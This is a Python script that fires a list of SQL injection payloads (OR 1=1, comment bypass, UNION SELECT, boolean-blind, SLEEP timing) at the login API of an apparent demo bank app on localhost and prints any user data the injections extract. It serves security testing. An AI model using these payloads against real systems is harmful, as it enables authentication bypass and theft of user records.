#!/usr/bin/env python3
"""
SQL Injection Testing Script
Tests SQL injection vulnerabilities on localhost:3000
WARNING: Only use on your own systems!
"""

import requests
import time
import json

BASE_URL = "http://localhost:3000"

# SQL Injection payloads
SQL_INJECTION_PAYLOADS = [
    {
        "name": "Basic OR 1=1",
        "username": "admin' OR '1'='1' --",
        "password": "anything"
    },
    {
        "name": "OR 1=1 (variant)",
        "username": "' OR '1'='1",
        "password": "' OR '1'='1"
    },
    {
        "name": "Comment bypass",
        "username": "admin'--",
        "password": ""
    },
    {
        "name": "Union SELECT",
        "username": "admin' UNION SELECT NULL,NULL,NULL--",
        "password": "test"
    },
    {
        "name": "Multiple OR conditions",
        "username": "' OR '1'='1' OR '1'='1' --",
        "password": "anything"
    },
    {
        "name": "Boolean-based blind",
        "username": "admin' AND '1'='1' --",
        "password": "anything"
    },
    {
        "name": "Time-based (if supported)",
        "username": "admin' OR SLEEP(5)--",
        "password": "test"
    },
    {
        "name": "Order by injection attempt",
        "username": "' ORDER BY 1--",
        "password": "test"
    }
]

def test_sql_injection(payload):
    """Test a single SQL injection payload"""
    url = f"{BASE_URL}/api/login"
    
    data = {
        "username": payload["username"],
        "password": payload["password"]
    }
    
    try:
        print(f"  Testing: {payload['username']}")
        start_time = time.time()
        response = requests.post(url, json=data, timeout=10)
        elapsed_time = time.time() - start_time
        
        result = {
            "payload_name": payload["name"],
            "status_code": response.status_code,
            "response_time": round(elapsed_time, 3),
            "success": False,
            "response": None
        }
        
        try:
            response_json = response.json()
            result["response"] = response_json
            result["success"] = response_json.get("success", False)
            
            if result["success"]:
                result["vulnerable"] = True
                result["user_data"] = response_json.get("user", {})
        except:
            result["response"] = response.text[:500]
        
        return result
        
    except Exception as e:
        return {
            "payload_name": payload["name"],
            "error": str(e),
            "success": False
        }

def main():
    print("\n" + "="*70)
    print("SQL Injection Testing - Meridian Trust Bank")
    print("="*70)
    print(f"Target: {BASE_URL}/api/login")
    print("="*70 + "\n")
    
    vulnerable_count = 0
    successful_logins = []
    
    for i, payload in enumerate(SQL_INJECTION_PAYLOADS, 1):
        print(f"[{i}/{len(SQL_INJECTION_PAYLOADS)}] {payload['name']}")
        
        result = test_sql_injection(payload)
        
        if result.get("success"):
            vulnerable_count += 1
            print(f"  ✓ VULNERABLE! Login successful!")
            print(f"  Response time: {result.get('response_time', 0)}s")
            
            if result.get("user_data"):
                user = result["user_data"]
                print(f"  Extracted user data:")
                print(f"    - ID: {user.get('id')}")
                print(f"    - Username: {user.get('username')}")
                print(f"    - Email: {user.get('email')}")
                successful_logins.append({
                    "payload": payload["name"],
                    "user": user
                })
            print()
        elif result.get("error"):
            print(f"  ✗ ERROR: {result['error']}\n")
        else:
            print(f"  ✗ Failed (Status: {result.get('status_code')})\n")
    
    # Summary
    print("="*70)
    print("SUMMARY")
    print("="*70)
    print(f"Total payloads tested: {len(SQL_INJECTION_PAYLOADS)}")
    print(f"Successful SQL injections: {vulnerable_count}")
    print(f"Vulnerable: {'YES' if vulnerable_count > 0 else 'NO'}")
    
    if successful_logins:
        print(f"\nSuccessfully logged in as:")
        for login in successful_logins:
            print(f"  - {login['user'].get('username')} ({login['user'].get('email')}) via '{login['payload']}'")
    print("="*70 + "\n")

if __name__ == "__main__":
    main()
